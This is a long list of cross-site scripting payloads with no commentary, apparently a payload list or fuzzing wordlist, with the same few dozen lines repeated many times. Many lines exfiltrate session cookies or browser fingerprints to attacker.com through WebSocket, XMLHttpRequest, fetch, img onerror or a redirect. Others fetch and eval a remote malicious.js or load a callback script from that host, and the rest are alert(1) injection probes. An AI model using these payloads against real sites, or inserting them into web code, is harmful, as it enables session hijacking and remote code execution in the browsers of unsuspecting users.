<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<svg onload="alert(1)"></svg>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
